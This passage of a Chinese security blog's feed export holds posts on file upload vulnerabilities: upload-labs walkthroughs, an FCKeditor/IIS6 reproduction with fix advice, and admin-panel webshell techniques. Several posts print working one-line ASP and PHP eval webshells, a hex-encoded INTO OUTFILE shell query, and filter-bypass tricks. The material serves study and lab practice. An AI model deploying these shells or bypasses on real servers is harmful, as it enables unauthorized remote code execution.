class="headerlink" title="利用后台管理向配置文件写 webshell"></a>利用后台管理向配置文件写 webshell</h5><p>利用 <code>&lt;%</code> 、 <code>%&gt;</code> 、<code>&#39;</code> 等构造小马程序的配置文件，配置文件保存为 <code>conf.asp</code> ，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">name = abcdefg</span><br><span class="line">addr = xxxxxxx</span><br><span class="line">    ip   = 1111111</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>可以修改 <code>name</code> 的值保存。我们可以这样输入 <code>name</code> 的值 <code>abcdef %&gt; &lt;% @eval request(&quot;cmd&quot;)&#39;</code>，第一个 <code>%&gt;</code> 和前面的构成闭合，<code>&#39;</code> 会注释掉第一行后面的内容，文本最后一个 <code>%&gt;</code> 与 <code>@eval</code> 前面的 <code>&lt;%</code> 构成闭合。只有一次尝试机会，构造错误，网站会崩。</p><h5 id="利用后台数据库备份及恢复获得-webshell"><a href="#利用后台数据库备份及恢复获得-webshell" class="headerlink" title="利用后台数据库备份及恢复获得 webshell"></a>利用后台数据库备份及恢复获得 webshell</h5><p>利用后台对 <code>access</code> 数据库的”备份数据库“或”恢复数据库“功能，”备份的数据库路径“等变量没有过滤导致可以把任意文件后缀改为 <code>asp</code> ，从而获得 <code>webshell</code>，<code>mssql</code> 版程序直接应用 <code>access</code> 代码，同样适用。备份网站 <code>asp</code> 文件为其他后缀如 <code>txt</code> 文件，可以查看并获得网页源码。从而会获得更多程序信息增加获得 <code>webshell</code>机会。</p><h5 id="利用数据库压缩功能"><a href="#利用数据库压缩功能" class="headerlink" title="利用数据库压缩功能"></a>利用数据库压缩功能</h5><p>将数据的防下载失效从而使插入数据库的小马成功运行，在友情链接添加的 <code>url</code> 写上 <code>&lt;%eval request(&quot;cmd&quot;)%&gt;</code>，提交后，在数据库操作中压缩数据库，可以成功压缩出 <code>asp</code> 文件。</p><h5 id="asp-mssql-系统"><a href="#asp-mssql-系统" class="headerlink" title="asp+mssql 系统"></a>asp+mssql 系统</h5><p>动网 mssql 版，可以直接本地提交来备份的，首先在发帖那上传一个写有 asp 代码的假图片，然后记住其上传路径。写一个本地提交的表单，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>asp+mssql 系统获取 webshell<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://yoursite/bbs/admin_dta.asp?</span> <span class="attr">action</span>=<span class="string">RestoreData&amp;act</span>=<span class="string">Restore</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>已上传文件的位置：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"Dbpath"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">size</span>=<span class="string">"80"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>要复制到的位置：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"backpath"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">size</span>=<span class="string">"80"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>另存为 .html 本地执行，把假图片上传路径填在“已上传文件的位置”那里，想要备份的 webshell 的相对路径填写在“要复制到的位置”那里，提交就得到了 webshell。</p><h5 id="php-mysql-系统"><a href="#php-mysql-系统" class="headerlink" title="php+mysql 系统"></a>php+mysql 系统</h5><p>后台需要有 mysql 数据查询功能，就可以利用它执行 <code>SELECT ... INTO OUTFILE</code> 查询输出 php 文件，因为所有的数据是存放在 mysql 里的，所以可以通过正常手段把 webshell 代码插入 mysql 在利用 <code>SELECT ... INTO OUTFILE</code> 语句导出 shell。在 mysql 操作里输入，如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 0x3C3F6576616C28245F504F53545B615D293B3F3E FROM mysql.user INTO OUTFILE &quot;路径&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/hextochar.png" alt></p><p>就可以获得一个 <code>&lt;?eval($_POST[a]);?&gt;</code> 的小马。</p><p><em>参考文章</em></p><blockquote><p><a href="https://blog.csdn.net/cangyingaoyou/article/details/12087527" target="_blank" rel="noopener">后台拿webshell的常用方法总结</a></p><p><a href="https://blog.51cto.com/simeon/2117821" target="_blank" rel="noopener">Fckeditor漏洞总结</a></p><p><a href="https://www.secpulse.com/archives/95987.html" target="_blank" rel="noopener">文件上传漏洞总结</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 总结文件上传漏洞，包括常规的上传绕过，编辑器漏洞，各种获取webshell的手段。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="文件上传漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="webshell" scheme="http://yoursite.com/tags/webshell/"/>
    
      <category term="编辑器漏洞" scheme="http://yoursite.com/tags/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Apache 和 Nginx 解析漏洞的验证</title>
    <link href="http://yoursite.com/2019/09/16/practice16/"/>
    <id>http://yoursite.com/2019/09/16/practice16/</id>
    <published>2019-09-16T11:56:28.000Z</published>
    <updated>2019-09-18T00:52:49.545Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 在 <code>Windows</code> 、 <code>CentOs</code> 和 <code>Ubuntu</code> 下不同版本的 <code>Apache</code> 和 <code>Nginx</code>解析漏洞的验证。</p><a id="more"></a><!--export--><!--toc--><h3 id="Docker-在-Ubuntu-上部署-LAMP"><a href="#Docker-在-Ubuntu-上部署-LAMP" class="headerlink" title="Docker 在 Ubuntu 上部署 LAMP"></a>Docker 在 Ubuntu 上部署 LAMP</h3><p>环境为<code>apache 2.4.7</code> + <code>ubuntu</code></p><h4 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h4><p>依次执行下面语句。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装一些必要的系统工具</span></span><br><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"><span class="comment"># 添加软件源信息</span></span><br><span class="line">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"><span class="comment"># 更新 yum 缓存</span></span><br><span class="line">sudo yum makecache fast</span><br><span class="line"><span class="comment"># 安装 Docker-ce</span></span><br><span class="line">sudo yum -y install docker-ce</span><br><span class="line"><span class="comment"># 启动 Docker 后台服务</span></span><br><span class="line">sudo systemctl start docker</span><br><span class="line"><span class="comment"># 测试运行</span></span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>寻找 <code>lamp</code> 环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp</span><br></pre></td></tr></table></figure><p><img src="/images/123lamp1.png" alt></p><p>按照描述找到相应的环境，本次安装的是 <code>tutum/lamp</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/lamp</span><br></pre></td></tr></table></figure><p><img src="/images/123lamp2.png" alt></p><h4 id="运行-Docker-验证"><a href="#运行-Docker-验证" class="headerlink" title="运行 Docker 验证"></a>运行 Docker 验证</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80 -p 3306:3306 tutum/lamp</span><br></pre></td></tr></table></figure><p><img src="/images/123lamp3.png" alt></p><p>打开网页</p><p><img src="/images/123lamp4.png" alt></p><p><img src="/images/123lamp5.png" alt></p><p>改大写，</p><p><img src="/images/123lamp6.png" alt></p><p>后缀名加 <code>.</code>，</p><p><img src="/images/123lamp7.png" alt></p><p>后缀名加未知后缀名。</p><p><img src="/images/123lamp8.png" alt></p><p>用 <code>docker</code> 安装好环境的网站根目录在</p><p><img src="/images/123lamp9.png" alt></p><h3 id="Docker-在-Ubuntu-上部署-LNMP"><a href="#Docker-在-Ubuntu-上部署-LNMP" class="headerlink" title="Docker 在 Ubuntu 上部署 LNMP"></a>Docker 在 Ubuntu 上部署 LNMP</h3><p>环境为 <code>nginx 1.10.1</code> + <code>ubuntu</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search lnmp</span><br></pre></td></tr></table></figure><p><img src="/images/123lnmp6.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull duckll/lnmp</span><br><span class="line">docker run -d -p 80:80 -p 3306:3306 duckll/lnmp</span><br></pre></td></tr></table></figure><p>打开网页，</p><p><img src="/images/123lnmp7.png" alt></p><p>查看 <code>phpinfo.php</code>，</p><p><img src="/images/123lnmp1.png" alt></p><p><img src="/images/123lnmp2.png" alt></p><p>修改成大写，</p><p><img src="/images/123lnmp3.png" alt></p><p>在后缀名后加 <code>.</code>，</p><p><img src="/images/123lnmp4.png" alt></p><p>在后缀名后加未知文件名，</p><p><img src="/images/123lnmp5.png" alt></p><h3 id="在-CentOS-7-部署-apache2-2"><a href="#在-CentOS-7-部署-apache2-2" class="headerlink" title="在 CentOS 7 部署 apache2.2"></a>在 CentOS 7 部署 apache2.2</h3><p>环境：<code>CentOs7</code> + <code>apache2.2.29</code> + <code>php 5.2.16</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 docker</span></span><br><span class="line">sudo systemctl start docker</span><br><span class="line"><span class="comment"># 搜索 apache2.2</span></span><br><span class="line">docker search apache2.2</span><br></pre></td></tr></table></figure><p><img src="/images/123apache2_1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">docker pull jriley555/apache2.2-php5.2</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">docker run -d -p 80:80 -p 3306:3306 jriley555/apache2.2-php5.2</span><br></pre></td></tr></table></figure><p>打开网页，</p><p><img src="/images/123apache2_2.png" alt></p><p>在网站根目录创建 <code>phpinfo.php</code> 重启服务，</p><p><img src="/images/123apache2_3.png" alt></p><p><img src="/images/123apache2_4.png" alt></p><p>改大写，</p><p><img src="/images/123apache2_5.png" alt></p><p>后缀加 <code>.</code>，</p><p><img src="/images/123apache2_6.png" alt></p><p>后缀加未知后缀，</p><p><img src="/images/123apache2_7.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 在 &lt;code&gt;Windows&lt;/code&gt; 、 &lt;code&gt;CentOs&lt;/code&gt; 和 &lt;code&gt;Ubuntu&lt;/code&gt; 下不同版本的 &lt;code&gt;Apache&lt;/code&gt; 和 &lt;code&gt;Nginx&lt;/code&gt;解析漏洞的验证。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="中间件解析漏洞" scheme="http://yoursite.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>富文本文件上传漏洞</title>
    <link href="http://yoursite.com/2019/09/15/FCK/"/>
    <id>http://yoursite.com/2019/09/15/FCK/</id>
    <published>2019-09-15T08:05:59.000Z</published>
    <updated>2019-09-15T13:29:44.842Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 掌握 <code>FCK</code> 编辑器上传漏洞的利用，了解如何修复 <code>FCK</code> 编辑器上传漏洞，了解如何在 <code>Windows Server 2003 SP2</code> 搭建 <code>FCKEditor</code> 环境。</p><a id="more"></a><!--export--><!--toc--><p><strong>实验环境</strong>：<code>Windows XP</code> + 中国菜刀 + <code>FCK 2.6.6</code> + <code>Windows Server 2003 SP2</code></p><h3 id="富文本编辑器文件上传漏洞"><a href="#富文本编辑器文件上传漏洞" class="headerlink" title="富文本编辑器文件上传漏洞"></a>富文本编辑器文件上传漏洞</h3><h4 id="IIS-解析原理"><a href="#IIS-解析原理" class="headerlink" title="IIS 解析原理"></a>IIS 解析原理</h4><p><code>Windows 2003</code> 中的 <code>IIS6</code> 存在这文件解析路径的漏洞，当文件夹名为类似 <code>xxx.asp</code> 结尾的目录名时，此时文件夹下的任何类型的文件都可以在 <code>IIS</code> 中被当作 <code>ASP</code> 程序来执行。这样黑客就可以上传扩展名为 <code>.jpg</code> 之类的图片文件的木马文件。通过访问这个文件即可运行木马，比如 <code>1.asp/a.jpg</code>。</p><h4 id="查看-FCK-版本信息"><a href="#查看-FCK-版本信息" class="headerlink" title="查看 FCK 版本信息"></a>查看 <code>FCK</code> 版本信息</h4><p>在浏览器地址栏中测测试网页后面输入：<code>/fck266/_whatnew.html</code>，查看版本信息。</p><p><img src="/images/122fck1.png" alt></p><h4 id="打开-FCK-编辑器上传点页面"><a href="#打开-FCK-编辑器上传点页面" class="headerlink" title="打开 FCK 编辑器上传点页面"></a>打开 <code>FCK</code> 编辑器上传点页面</h4><p>在测试网页后面输入 <code>/editor/filemanager/connectors/test.html</code> ，进入上传点页面。</p><p><img src="/images/122fck2.png" alt></p><h4 id="上传测试"><a href="#上传测试" class="headerlink" title="上传测试"></a>上传测试</h4><p>在桌面上创建 <code>1.asp</code> 文件，打开文件，写入一句话木马，保存成功后，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;cmd&quot;)%&gt;</span><br></pre></td></tr></table></figure><p>另存为一份，保存为 <code>1.jpg</code> 文件。</p><p><img src="/images/122fck3.png" alt></p><p>在上传页面，选择 <code>1.jpg</code> 文件，</p><p><img src="/images/122fck4.png" alt></p><p>上传成功后，点击 <code>Get Folders and Files</code>，获取图片地址。</p><p><img src="/images/122fck5.png" alt></p><p>在新标签页输入图片地址查看图片，因上传的图片木马所以无法显示。</p><p><img src="/images/122fck6.png" alt></p><p>返回到上传点页面，上传 <code>1.asp</code> 文件，页面会报错。</p><p><img src="/images/122fck8.png" alt></p><h4 id="新建-1-asp-文件夹"><a href="#新建-1-asp-文件夹" class="headerlink" title="新建 1.asp 文件夹"></a>新建 <code>1.asp</code> 文件夹</h4><p>在上传点页面，点击 <code>Create Folder</code> ，输入 <code>/1.asp</code> 作为文件名。</p><p><img src="/images/122fck9.png" alt></p><p>点击 <code>Get Folders and Files</code> 查看文件夹</p><p><img src="/images/122fck10.png" alt></p><p>上传 <code>1.jpg</code> 文件，</p><p><img src="/images/122fck11.png" alt></p><p>查看文件。</p><p><img src="/images/122fck13.png" alt></p><h4 id="使用中国菜刀"><a href="#使用中国菜刀" class="headerlink" title="使用中国菜刀"></a>使用中国菜刀</h4><p>打开中国菜刀，输入 <code>webshell</code> 地址，密码和类型。</p><p><img src="/images/122fck14.png" alt></p><p>添加成功后，双击打开，发现成功。</p><p><img src="/images/122fck15.png" alt></p><p>寻找 <code>key</code>。</p><p><img src="/images/122fck16.png" alt></p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>客户端检测，使用 <code>JS</code> 对长传图片的大小，扩展名，文件类型等进行检测。</li><li>服务端对文件路径，扩展名，类型，内容等进行检测，对文件进行重命名。</li><li>服务端上传目录设置为不可执行权限。</li></ol><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p>实验环境：<code>Windows Server 2003 Enterprise Edition SP2</code> + <code>FCKEditor 2.6.6</code></p><p>在 <code>CKEditor</code> 官网下载 <code>FCKEditor 2.6.6</code> ，<a href="https://ckeditor.com/cke4/release-notes?page=17" target="_blank" rel="noopener">下载FCK2.6.6源码</a>。</p><p><img src="/images/122fck17.png" alt></p><p>下载完毕后，把压缩包解压到 <code>C:\www</code> 目录下。</p><p><img src="/images/122fck17.png" alt></p><p>打开 <code>IIS</code>新建网站，</p><p><img src="/images/122fck18.png" alt></p><p>先填写网站描述，</p><p><img src="/images/122fck19.png" alt></p><p>填写 <code>IP</code> 地址和端口设置，点击下一步后，</p><p><img src="/images/122fck20.png" alt></p><p>选择网站根目录，点击下一步，</p><p><img src="/images/122fck21.png" alt></p><p>记得要勾选允许匿名访问网站，否则访问网站的需要输入用户名和密码。</p><ul><li><input checked disabled type="checkbox"> 允许匿名访问网站</li></ul><p><img src="/images/122fck34.png" alt></p><p>点击下一步后，要设置网站访问权限，为了方便全部勾选。</p><p><img src="/images/122fck23.png" alt></p><p>完成后，右击新建网站选择属性，</p><p><img src="/images/122fck24.png" alt></p><p>在弹窗中，选择主目录 → 配置 → 选项 → 勾选启用父路径，</p><p><img src="/images/122fck25.png" alt></p><p>用浏览器打开网页，</p><p><img src="/images/122fck26.png" alt></p><p>打开文件长传网页 <code>test.html</code>，</p><p><img src="/images/122fck27.png" alt></p><p>提示 <code>This connector is disabled.</code></p><p>打开 <code>C:\www\fck\editor\filemanager\connectors\asp</code> 文件夹下的 <code>config.asp</code>。把 <code>ConfigIsEnabled</code> 设置为 <code>True</code>。</p><p><img src="/images/122fck28.png" alt></p><p>保存退出。</p><p><img src="/images/122fck29.png" alt></p><p>刷新网页，网页正常显示，</p><p><img src="/images/122fck30.png" alt></p><p>上传一个正常图片，</p><p><img src="/images/122fck31.png" alt></p><p>修改为 <code>NET</code> 模式，继续实验。</p><p><img src="/images/122fck35.png" alt></p><p>在根目录下新建 <code>/1.asp</code> 文件夹，向 <code>/1.asp/</code>上传图片木马，用中国菜刀成功连接。</p><p><img src="/images/122fck33.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 掌握 &lt;code&gt;FCK&lt;/code&gt; 编辑器上传漏洞的利用，了解如何修复 &lt;code&gt;FCK&lt;/code&gt; 编辑器上传漏洞，了解如何在 &lt;code&gt;Windows Server 2003 SP2&lt;/code&gt; 搭建 &lt;code&gt;FCKEditor&lt;/code&gt; 环境。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>练习15-文件后缀解析漏洞</title>
    <link href="http://yoursite.com/2019/09/13/practice15/"/>
    <id>http://yoursite.com/2019/09/13/practice15/</id>
    <published>2019-09-13T09:02:39.000Z</published>
    <updated>2019-09-15T13:10:48.752Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>upload-labs</code> 中的 <code>Pass-03 - Pass12</code> 文件后缀解析漏洞。</p><a id="more"></a><!--export--><!--toc--><h2 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h2><h3 id="文件上传分类"><a href="#文件上传分类" class="headerlink" title="文件上传分类"></a>文件上传分类</h3><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png" alt></p><h3 id="如何判断上传漏洞类型"><a href="#如何判断上传漏洞类型" class="headerlink" title="如何判断上传漏洞类型"></a>如何判断上传漏洞类型</h3><p><img src="/images/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B.png" alt></p><h3 id="根据不同类型选择不同方式"><a href="#根据不同类型选择不同方式" class="headerlink" title="根据不同类型选择不同方式"></a>根据不同类型选择不同方式</h3><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.png" alt></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><h4 id="先判断上传漏洞的类型"><a href="#先判断上传漏洞的类型" class="headerlink" title="先判断上传漏洞的类型"></a>先判断上传漏洞的类型</h4><p>打开第三关首页，寻找上传点，我们可以很容易找到上传点。</p><p><img src="/images/121p3_1.png" alt></p><p>先选择一个 <code>404.txt</code> 文件上传，</p><p><img src="/images/121p3_2.png" alt></p><p>发现可以上传成功，右击复制图片地址，可以查看文件内容。</p><p><img src="/images/121p3_3.png" alt></p><p>返回首页，选择 <code>shell.php</code> 文件上传，发现上传失败。</p><p><img src="/images/121p3_4.png" alt></p><p>根据以上操作，可以发现该判断机制为后缀的黑名单判断。除此之外，通过 <code>Wappalyzer</code> 插件可以搜集到很多信息。</p><p><img src="/images/121p3_5.png" alt></p><h4 id="根据已知信息构造后缀绕过检查"><a href="#根据已知信息构造后缀绕过检查" class="headerlink" title="根据已知信息构造后缀绕过检查"></a>根据已知信息构造后缀绕过检查</h4><p>根据提示可知 <code>.php</code> 文件是不允许的，那么可以通过修改后缀名来绕过后缀名检查。可以新建一个 <code>2.phtml</code> </p><p><img src="/images/121p3_6.png" alt></p><p>然后直接上传 <code>2.phtml</code> 文件绕过后缀名检查。</p><p><img src="/images/121p3_8.png" alt></p><p>也可以打开 <code>burpsuite</code> 软件，在上传时，修改 <code>2.php</code> 的后缀为 <code>2.phtml</code> 。来绕过后缀名检查。</p><p><img src="/images/121p3_7.png" alt></p><p>上传成功后，右击选择复制图片地址，在新标签页打开，可以发现</p><p><img src="/images/121p3_9.png" alt></p><h4 id="Pass-03-代码分析"><a href="#Pass-03-代码分析" class="headerlink" title="Pass-03 代码分析"></a>Pass-03 代码分析</h4><p>核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">$file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现，黑名单中含的名单过少，所以可以通过 <code>.phtml</code> 绕过。由于 <code>deldot()</code> 、<code>strtolower()</code>和 <code>trim()</code> 函数的存在，所以无法用后缀那个加 <code>.</code> 或者 <code>空格</code> 等方法绕过。 当我们输入 <code>2.php.空格.</code> 时，经过 <code>deldot()</code> 函数后，变为 <code>2.php.空格</code> ，再经过 <code>strrchr()</code> 函数后变为 <code>.空格</code>，经过 <code>strtolower()</code> 和 <code>str_ireplace()</code> 后，没有变化，最后经过 <code>trim()</code> 函数后，变为 <code>.</code>。<code>2.php.空格.</code> 虽然可以绕过上传成功，但是文件名为随机数加 <code>.</code>，无法解析。</p><p><img src="/images/121p3_10.png" alt></p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><h4 id="先判断上传漏洞的类型-1"><a href="#先判断上传漏洞的类型-1" class="headerlink" title="先判断上传漏洞的类型"></a>先判断上传漏洞的类型</h4><p>选择 <code>1.php</code> 点击上传，发现无法上传。</p><p><img src="/images/121p4_2.png" alt></p><p>选择  <code>webshell.txt</code> 点击上传，发现可以上传成功，</p><p><img src="/images/121p4_1.png" alt></p><p>右击选择复制图片地址，在新标签页中打开，可以看到上传的文件名和文件内容。</p><p><img src="/images/121p4_3.png" alt></p><p>发现服务器并没有对文件名进行重命名。</p><p><img src="/images/121p4_4.png" alt></p><p>此上传类型为不重命名的黑名单上传。</p><h4 id="根据已知信息构造后缀绕过检查-1"><a href="#根据已知信息构造后缀绕过检查-1" class="headerlink" title="根据已知信息构造后缀绕过检查"></a>根据已知信息构造后缀绕过检查</h4><h5 id="使用-htaccess-绕过"><a href="#使用-htaccess-绕过" class="headerlink" title="使用 .htaccess 绕过"></a>使用 .htaccess 绕过</h5><p>新建 <code>.htaccess</code>文件，写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><img src="/images/121p4_19.png" alt></p><p>新建 <code>404.jpg</code> 用记事本打开，写入一句话木马，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>另存为 <code>404.jpg</code> 文件。</p><p><img src="/images/121p4_20.png" alt></p><p>先上传 <code>.htaccess</code> 文件，使得上传的文件按 <code>php</code> 解析。</p><p><img src="/images/121p4_17.png" alt></p><p>再上传 <code>404.jpg</code> 文件</p><p><img src="/images/121p4_18.png" alt></p><p>查看图片地址，</p><p><img src="/images/121p4_21.png" alt></p><p>虽然是 <code>.jpg</code> 格式，但按照的是 <code>php</code> 文件的解析，所以可以成功。</p><h5 id="利用系统特性覆盖空的php文件"><a href="#利用系统特性覆盖空的php文件" class="headerlink" title="利用系统特性覆盖空的php文件"></a>利用系统特性覆盖空的php文件</h5><p><code>windows</code> 系统下，<code>&lt;</code> 等于 <code>*</code>，即代表任意字符。 </p><p><em>参考文章</em>：</p><blockquote><p><a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">当php邂逅windows通用上传缺陷</a></p></blockquote><p>思路：利用特殊方法生成一个 <code>php</code> 文件，然后再利用改特性将文件覆盖。</p><p>打开 <code>burpsuit</code> 软件，选择 <code>2.php</code> 点击上传，抓取数据包，然后发送到 <code>Repeater</code> 模块，这这里进行尝试，知道发现可以上传的文件后缀名为止。</p><p><img src="/images/121p4_5.png" alt></p><p>依次尝试文件上传思维导图中黑名单中的方法，发现当文件名为 <code>2.php:.jpg</code> 可以上传成功。</p><p><img src="/images/121p4_6.png" alt></p><p>返回到 <code>Proxy</code> 模块，修改文件后缀为 <code>3.php:.jpg</code> ，点击 <code>Forward</code>，</p><p><img src="/images/121p4_9.png" alt></p><p>右击选择复制图片地址，在新标签页中打开，由于 <code>windows</code> 系统会把后缀名解析为 <code>3.php</code>，</p><p><img src="/images/121p4_10.png" alt></p><p>修改文件后缀名，继续查看。</p><p><img src="/images/121p4_11.png" alt></p><p>发现没有内容，打开服务器，查看 <code>3.php</code> 发现没有内容。</p><p><img src="/images/121p4_12.png" alt></p><p>重新上传，用 <code>burpsuite</code> 修改后缀名为 <code>3.&lt;&lt;&lt;</code>，上传成功后，重新查看文件。</p><p><img src="/images/121p4_13.png" 